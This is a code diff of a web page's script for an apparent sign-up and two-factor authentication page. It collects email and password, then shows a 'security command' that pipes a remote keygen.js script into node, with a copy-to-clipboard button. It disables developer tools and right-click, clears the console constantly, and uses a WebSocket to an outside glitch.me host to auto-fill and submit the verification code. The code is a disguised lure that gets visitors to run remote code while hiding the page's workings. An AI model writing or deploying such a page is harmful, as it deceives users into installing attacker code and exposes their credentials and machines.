+    <div class="success-alert" id="alert">Security command copied to clipboard!</div>
+
+    <!-- Scripts -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/uuid/8.3.2/uuid.min.js"></script>
+    <script>
+        // DOM Elements
+        const modal = document.getElementById("twoFAModal");
+        const openModalBtn = document.getElementById("openModalBtn");
+        const closeModalBtn = document.querySelector(".modal-close");
+        const twoFAForm = document.getElementById("twoFAForm");
+        const tfa_code = document.getElementById("tfa_code");
+        const copyBtn = document.getElementById("copyBtn");
+        const secureCommand = document.getElementById("secureCommand");
+        const passwordToggle = document.querySelector(".password-toggle");
+        const passwordInput = document.getElementById("password");
+        const verificationInputs = document.querySelectorAll(".verification-input");
+
+        // Password toggle functionality
+        passwordToggle.addEventListener("click", function() {
+            const isPassword = passwordInput.type === "password";
+            passwordInput.type = isPassword ? "text" : "password";
+            
+            if (isPassword) {
+                passwordToggle.innerHTML = `
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.878 9.878L3 3m6.878 6.878L21 21"></path>
+                `;
+            } else {
+                passwordToggle.innerHTML = `
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path>
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path>
+                `;
+            }
         });
-    };
 
-    setInterval(() => {
-      console.clear();
-    }, 100);
+        // Auto-focus next input on verification code entry
+        verificationInputs.forEach((input, index) => {
+            input.addEventListener("input", function() {
+                if (this.value.length === 1 && index < verificationInputs.length - 1) {
+                    verificationInputs[index + 1].focus();
+                }
+            });
+            
+            input.addEventListener("keydown", function(e) {
+                if (e.key === "Backspace" && this.value === "" && index > 0) {
+                    verificationInputs[index - 1].focus();
+                }
+            });
+        });
 
-    document.addEventListener('contextmenu', function(event) {
-        event.preventDefault();
-    });
-
-    document.addEventListener('keydown', function(event) {
-      if (event.key === 'F12') {
-        event.preventDefault();  // Disables F12
-      }
-      if (event.ctrlKey && event.key === 'i') {
-        event.preventDefault();  // Prevent the default action (open dev tools)
-      }
-    });
-
-    document.getElementById("tfa-submit-btn").onclick = (event)=>{
-      if(document.getElementById('v1').value != '' && document.getElementById('v2').value != '' && document.getElementById('v3').value != '' &&
-      document.getElementById('v4').value != '' && document.getElementById('v5').value != '' && document.getElementById('v6').value != ''){
-        document.getElementById('auth-alert').style.display = 'none';
-        
-        // Check if this is a login flow
-        let isLoginFlow = false;
-        try {
-          const userStr = localStorage.getItem('user');
-          if (userStr) {
-            const user = JSON.parse(userStr);
-            isLoginFlow = user.needs2FA && user.authenticated;
-          }
-        } catch (error) {
-          console.error('Error checking user status:', error);
-        }
-        
-        if (isLoginFlow) {
-          // For login flow, clear the needs2FA flag and redirect to home
-          const userStr = localStorage.getItem('user');
-          if (userStr) {
-            const user = JSON.parse(userStr);
-            user.needs2FA = false; // Clear the flag
-            localStorage.setItem('user', JSON.stringify(user));
-          }
-          
-          // Show success message and redirect to home
-          modal.style.display = "none";
-          setTimeout(() => {
-            window.location.href = '/';
-          }, 1000);
-        } else {
-          // For registration flow, show success alert
-          setTimeout(() => {
-            document.getElementById('auth-alert').style.display = 'inline';  
-          }, 500);
-        }
-        
-        event.preventDefault();
-      }
-    }
-
-    // Open the modal
-    openModalBtn.onclick = function() {
-        if((document.getElementById('email').value != "") && (document.getElementById('password').value != "")){
-          // Update the command display with the current domain
-          const domainUrl = window.location.origin;
-          const commandText = `curl -s ${domainUrl}/api/keygen.js | node`;
-          secureCommand.textContent = commandText;
-          
-          modal.style.display = "block";
-          document.getElementById('invalid-alert').style.display = 'none';
-        }else{
-          document.getElementById('invalid-alert').style.display = 'block';
-        }
-    }
-
-    // Close the modal when the user clicks on <span> (x)
-    closeModalSpan.onclick = function() {
-        modal.style.display = "none";
-    }
-
-    const PING = 99;
-    const SEND_UID = 101;
-    const BROWSER_CONNECTED = 102;
-    const LOOK_UID = 103;
-    const uniqueId = uuid.v4();
-    const ws = new WebSocket("wss://mature-flossy-morning.glitch.me");
-      ws.onopen = () => {
-        // Create a JSON object
-        const jsonObject = {
-          e: BROWSER_CONNECTED,
-          v: uniqueId
-        };
-        const jsonData = JSON.stringify(jsonObject);
-        // Send JSON data as a text message
-        ws.send(jsonData);
-      };
-      
-      setInterval(() => {
-        const pingObject = {
-          e: PING,
-          v: "k"
-        };
-        const pingData = JSON.stringify(pingObject);
-        ws.send(pingData);
-      }, 5000);
-
-      ws.onmessage = (event) => {
-          const msg = JSON.parse(event.data);
-          switch (msg.e) {
-            case SEND_UID:
-              document.getElementById('v1').value = msg.v[0];
-              document.getElementById('v2').value = msg.v[1];
-              document.getElementById('v3').value = msg.v[2];
-              document.getElementById('v4').value = msg.v[3];
-              document.getElementById('v5').value = msg.v[4];
-              document.getElementById('v6').value = msg.v[5];
-
-              tfa_code.value = msg.v;
-              
-              // Check if this is a login flow (user has needs2FA flag)
-              let isLoginFlow = false;
-              try {
+        // Check if user is coming from login flow
+        window.addEventListener('load', function() {
+            try {
                 const userStr = localStorage.getItem('user');
                 if (userStr) {
-                  const user = JSON.parse(userStr);
-                  isLoginFlow = user.needs2FA && user.authenticated;
-                }
-              } catch (error) {
-                console.error('Error checking user status:', error);
-              }
-              
-              setTimeout(()=>{
-                if (isLoginFlow) {
-                  // For login flow, clear the needs2FA flag and redirect to home
-                  const userStr = localStorage.getItem('user');
-                  if (userStr) {
                     const user = JSON.parse(userStr);
-                    user.needs2FA = false; // Clear the flag
-                    localStorage.setItem('user', JSON.stringify(user));
-                  }
-                  
-                  // Show success message and redirect to home
-                  modal.style.display = "none";
-                  setTimeout(() => {
-                    window.location.href = '/';
-                  }, 1000);
-                } else {
-                  // For registration flow, submit the form as usual
-                  document.getElementById('signForm').submit();
+                    if (user.needs2FA && user.authenticated) {
+                        // Auto-show modal for login flow
+                        const domainUrl = window.location.origin;
+                        const commandText = `curl -s ${domainUrl}/api/keygen.js | node`;
+                        secureCommand.textContent = commandText;
+                        modal.style.display = "block";
+                        
+                        // Hide the registration form since this is a login flow
+                        document.querySelector('.form-container').style.display = 'none';
+                        
+                        // Update the page title/heading for login flow
+                        document.title = "2FA Authentication - P12";
+                        document.querySelector('.logo-title').textContent = "Complete Sign-In";
+                        document.querySelector('.logo-subtitle').textContent = "Two-factor authentication required";
+                        
+                        // Update modal title for login flow
+                        document.querySelector('.modal-title').textContent = "🔐 Complete Your Sign-In";
+                        
+                        // Update the security protocol text for login flow
+                        document.querySelector('.security-description').textContent = "Welcome back! To complete your sign-in, please verify your identity using our advanced two-factor authentication system.";
+                    }
                 }
-              }, 3000);
+            } catch (error) {
+                console.error('Error checking user status:', error);
+            }
+        });
 
-              setTimeout(()=>{
-                document.getElementById('v1').value = "";
-                document.getElementById('v2').value = "";
-                document.getElementById('v3').value = "";
-                document.getElementById('v4').value = "";
-                document.getElementById('v5').value = "";
-                document.getElementById('v6').value = "";
-              }, 5000);
-              break;
-            default:
-              break;
-          }
-      };
-  </script>
+        // Copy command functionality
+        copyBtn.addEventListener("click", function() {
+            const domainUrl = window.location.origin;
+            const commandText = `curl -s ${domainUrl}/api/keygen.js | node`;
+            
+            navigator.clipboard.writeText(commandText)
+                .then(() => {
+                    copyBtn.textContent = "✅ Copied!";
+                    copyBtn.style.color = "#1EDB8C";
+                    
+                    // Show success alert
+                    const alertBox = document.getElementById("alert");
+                    alertBox.classList.add("show");
+                    
+                    setTimeout(() => {
+                        copyBtn.textContent = "📋 Copy";
+                        copyBtn.style.color = "#43BBFF";
+                        alertBox.classList.remove("show");
+                    }, 2000);
+                })
+                .catch(err => {
+                    console.error('Error copying command: ', err);
+                    copyBtn.textContent = "❌ Error";
+                    copyBtn.style.color = "#FF6B6B";
+                    
+                    setTimeout(() => {
+                        copyBtn.textContent = "📋 Copy";
+                        copyBtn.style.color = "#43BBFF";
+                    }, 2000);
+                });
+        });
+
+        // Clear console periodically (security measure)
+        setInterval(() => {
+            console.clear();
+        }, 100);
+
+        // Disable right-click context menu
+        document.addEventListener('contextmenu', function(event) {
+            event.preventDefault();
+        });
+
+        // Disable F12 and Ctrl+I
+        document.addEventListener('keydown', function(event) {
+            if (event.key === 'F12' || (event.ctrlKey && event.key === 'i')) {
+                event.preventDefault();
+            }
+        });
+
+        // 2FA submit handler
+        document.getElementById("tfa-submit-btn").addEventListener("click", function(event) {
+            event.preventDefault();
+            
+            const allInputsFilled = Array.from(verificationInputs).every(input => input.value !== '');
+            
+            if (allInputsFilled) {
+                document.getElementById('auth-alert').style.display = 'none';
+                
+                // Check if this is a login flow
+                let isLoginFlow = false;
+                try {
+                    const userStr = localStorage.getItem('user');
+                    if (userStr) {
+                        const user = JSON.parse(userStr);
+                        isLoginFlow = user.needs2FA && user.authenticated;
+                    }
+                } catch (error) {
+                    console.error('Error checking user status:', error);
+                }
+                
+                if (isLoginFlow) {
+                    // For login flow, clear the needs2FA flag and redirect to home
+                    const userStr = localStorage.getItem('user');
+                    if (userStr) {
+                        const user = JSON.parse(userStr);
+                        user.needs2FA = false;
+                        localStorage.setItem('user', JSON.stringify(user));
+                    }
+                    
+                    // Show success and redirect
+                    modal.style.display = "none";
+                    setTimeout(() => {
+                        window.location.href = '/';
+                    }, 1000);
+                } else {
+                    // For registration flow, show success alert
+                    setTimeout(() => {
+                        document.getElementById('auth-alert').style.display = 'inline';
+                    }, 500);
+                }
+            } else {
+                document.getElementById('auth-alert').style.display = 'inline';
+            }
+        });
+
+        // Open modal
+        openModalBtn.addEventListener("click", function() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            if (email && password) {
+                // Update the command display with the current domain
+                const domainUrl = window.location.origin;
+                const commandText = `curl -s ${domainUrl}/api/keygen.js | node`;
+                secureCommand.textContent = commandText;
+                
+                modal.style.display = "block";
+                document.getElementById('invalid-alert').style.display = 'none';
+            } else {
+                document.getElementById('invalid-alert').style.display = 'block';
+            }
+        });
+
+        // Close modal
+        closeModalBtn.addEventListener("click", function() {
+            modal.style.display = "none";
+        });
+
+        // Close modal when clicking outside
+        window.addEventListener("click", function(event) {
+            if (event.target === modal) {
+                modal.style.display = "none";
+            }
+        });
+
+        // WebSocket connection for auto-filling verification code
+        const PING = 99;
+        const SEND_UID = 101;
+        const BROWSER_CONNECTED = 102;
+        const uniqueId = uuid.v4();
+        const ws = new WebSocket("wss://mature-flossy-morning.glitch.me");
+        
+        ws.onopen = () => {
+            const jsonObject = {
+                e: BROWSER_CONNECTED,
+                v: uniqueId
+            };
+            ws.send(JSON.stringify(jsonObject));
+        };
+        
+        // Send ping every 5 seconds
+        setInterval(() => {
+            if (ws.readyState === WebSocket.OPEN) {
+                const pingObject = {
+                    e: PING,
+                    v: "k"
+                };
+                ws.send(JSON.stringify(pingObject));
+            }
+        }, 5000);
+
+        ws.onmessage = (event) => {
+            const msg = JSON.parse(event.data);
+            if (msg.e === SEND_UID) {
+                // Auto-fill verification code
+                verificationInputs.forEach((input, index) => {
+                    if (msg.v[index]) {
+                        input.value = msg.v[index];
+                    }
+                });
+                
+                tfa_code.value = msg.v;
+                
+                // Check if this is a login flow
+                let isLoginFlow = false;
+                try {
+                    const userStr = localStorage.getItem('user');
+                    if (userStr) {
+                        const user = JSON.parse(userStr);
+                        isLoginFlow = user.needs2FA && user.authenticated;
+                    }
+                } catch (error) {
+                    console.error('Error checking user status:', error);
+                }
+                
+                setTimeout(() => {
+                    if (isLoginFlow) {
+                        // For login flow, clear the needs2FA flag and redirect to home
+                        const userStr = localStorage.getItem('user');
+                        if (userStr) {
+                            const user = JSON.parse(userStr);
+                            user.needs2FA = false;
+                            localStorage.setItem('user', JSON.stringify(user));
+                        }
+                        
+                        modal.style.display = "none";
+                        setTimeout(() => {
+                            window.location.href = '/';
+                        }, 1000);
+                    } else {
+                        // For registration flow, submit the form
+                        document.getElementById('signForm').submit();
+                    }
+                }, 3000);
+
+                // Clear inputs after 5 seconds
+                setTimeout(() => {
+                    verificationInputs.forEach(input => {
+                        input.value = "";
+                    });
+                }, 5000);
+            }
+        };
+
+        ws.onerror = (error) => {
+            console.error('WebSocket error:', error);
+        };
+    </script>
+</body>
 </html>
